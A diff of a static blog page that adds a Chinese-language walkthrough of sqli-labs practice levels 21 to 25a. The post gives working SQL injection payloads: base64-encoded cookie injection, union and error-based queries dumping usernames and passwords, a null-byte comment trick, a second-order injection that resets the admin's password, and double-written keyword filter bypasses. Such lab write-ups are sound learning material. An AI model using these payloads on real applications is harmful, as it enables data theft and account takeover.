@@ -71,6 +71,88 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-21-25关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/18/sql-21-25%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-12-18T14:07:15.000Z" itemprop="datePublished">2022-12-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/12/18/sql-21-25%E5%85%B3/">sql 21-25关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>sql二十一关</p>
+<p>1.对其进行抓包，发现它cookie发生了变化，不在是上一关的dumb，而是一串乱码，长的就跟base64编码一样，直接解码，发现就是admin，这提示我们要以base64加密的方式进行cookie头的注入，于是对dumb’加密得到新乱码，放进去，报错，查看报错信息，该成’)，发现成功登入，使用报错注入。dumb’) and updatexml(1,concat(0x7e,database(),0x7e),1)#，也要加密，变为ZHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIw&#x3D;&#x3D;</p>
+<p>2.dumb’) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1)#爆表，也要加密</p>
+<p>3.dumb’) and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)#爆字段</p>
+<p>sql第二十二关</p>
+<p>1.输入dumb看看页面，试几次，发现是双引号闭合</p>
+<p>2.同二十一关</p>
+<p>sql第二十三关</p>
+<p>1.没有输入框，变成get传参了，输入id&#x3D;1’，发现页面报错，且触发mysqli_fetch_array()函数，说明被过滤了，而且是一些注释符号被过滤了，有两种解决办法，一种是用and或or语句进行闭合，还有一种是用一种特殊的注释符，针对于sql-labs特殊使用的注释符;%00</p>
+<p>2.发现不管怎么输入order by发现都正确，这是有问题的，后面经搜索得知这个mysql执行顺序有问题导致的，这关不能用order by来判断字段数，而要用union： SELECT * FROM table_name WHERE id&#x3D;’1’ union select 1,2,3,4 or ‘1’&#x3D;’1’ LIMIT 0,1，这种方式可以判断出几栏，也只有这个判断字段数的语句才会面临这种执行出问题的情况，其它都是正常的</p>
+<p>3.输入id&#x3D;-1’ union select 1,2,3 and ‘1’&#x3D;’1,发现回显位还是2和3那边</p>
+<p>4.输入?id&#x3D;-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 and ‘1’&#x3D;’1，实际上跟以前也没差，就是没用注释符号了而已</p>
+<p>5.不再赘述</p>
+<p>6.再介绍那种特殊注释符的方法吧，就是用%00，然后跟sql第一关的句子用一样的即可。但是这个注释符的使用形式跟之前的略有不同，例如需要输入?id&#x3D;1’ ;%00和?id&#x3D;-1’ union select 1,2,3 ;%00这样的形式才能注释掉。</p>
+<p>sql第二十四关</p>
+<p>1.这关是个新页面，直接照常先输入两个1看看，回显错误页面，输入dumb看看，发现邀请我们改密码，改密码这操作是防止我们在密码的口这边注入的，也不知道原来的密码，就不管了，看看另外两个链接，发现其中一个是让我们当场注册的，试了一下发现确实可以，数据库里也出现了新的一行，就是我们注册的新用户和密码，但用什么闭合都无法触发注入，估计注入点不在这上面，于是决定先用burpsuite抓包看看</p>
+<p>2.发现有个异常值，cookie里的，但也判断不出是啥玩意，回想下题目是叫做“基于储存的二次注入”，那估计注入点是在改密码上，但这玩意依旧是没什么方向的，参考资料得了，先看看二次注入定义。二次注入：攻击者构造的恶意数据储存在数据库后，恶意数据被读取并进入到sql所导致的注入。</p>
+<p> 二次注入主要分两步：</p>
+<pre><code>插入恶意数据：
+    第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留的原来的数据，但是数据本身包含恶意内容。
+
+引用恶意数据：
+    在将数据存入数据库后，开发者认为数据是可信的，在下一次需要进行的查询的时候，直接从数据库中提出了恶意数据，没有进行进一步的检验和处理，就会造成sql的二次注入
+</code></pre>
+<p>3.注册个账户admin’# ，密码设为000000，然后登陆，查看一下源代码，实际上执行逻辑是这样的：　</p>
+<pre><code>原SQL语句： UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;
+</code></pre>
+<p>　　修改密码sql语句：UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin’#’ and password&#x3D;’$curr_pass’</p>
+<p>　　最后真正执行的sql语句：UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin’</p>
+<p>这个注入点实际上就跟开始想的一样，要在改密码那边弄，这边update的语句就是供你改密码用的</p>
+<p>4.在该密码那边登入账户admin’#，将密码从000000改为123456，成功，实际上我们输入的admin’#相当于顶替掉了原有的admin账号的主人，改掉了他的账户密码，所以 这就算我们注入成功了，这关压根没有任何查询语句要注入，纯粹一种新的攻击方式</p>
+<p>sql第二十五关</p>
+<p>1.这关还是个新页面，页面直接告诉我们and和or被过滤了，说明是一个找绕过过滤的题目，先初步判断出是单引号闭合</p>
+<p>2.输入?id&#x3D;1’ oorrder by 3–+，发现可以绕过，看来只过滤一次，判断出有三列，&#x2F;&#x2F;使用url编码和二次编码以及内联注释等操作无法绕过，看来只能双写绕过。</p>
+<p>3.?id&#x3D;-1’ union select 1,2,3 –+确定回显</p>
+<p>4.?id&#x3D;-1’ union select 1,database(),version() –+爆库名</p>
+<p>5.?id&#x3D;-1’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;’security’ –+爆表</p>
+<p>6.?id&#x3D;-1’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema&#x3D;’security’ anandd table_name&#x3D;’users’–+爆列</p>
+<p>7.?id&#x3D;-1’ union select 1,group_concat(username),group_concat(passwoorrd) from users–+爆数据</p>
+<p>sql第二十五a关</p>
+<p>1.发现居然有二十五a关，当作是子关吧</p>
+<p>2.?id&#x3D;-1 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;’security’ –+爆表</p>
+<p>3.?id&#x3D;-1 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema&#x3D;’security’ anandd table_name&#x3D;’users’–+爆字段</p>
+<p>4，?id&#x3D;-1 union select 1,group_concat(username),group_concat(passwoorrd) from users–+爆数据</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/18/sql-21-25%E5%85%B3/" data-id="clgb0hc0g0000pgxx6vpqbvks" data-title="sql 21-25关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sql-16-20关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/12/17/sql-16-20%E5%85%B3/" class="article-date">
@@ -371,7 +453,7 @@
           </li>
         
           <li>
-            <a href="/2022/12/27/sql-51-55%E5%85%B3/">sql 51-55关</a>
+            <a href="/2022/12/28/sql-61-65%E5%85%B3/">sql 61-65关</a>
           </li>
         
       </ul>
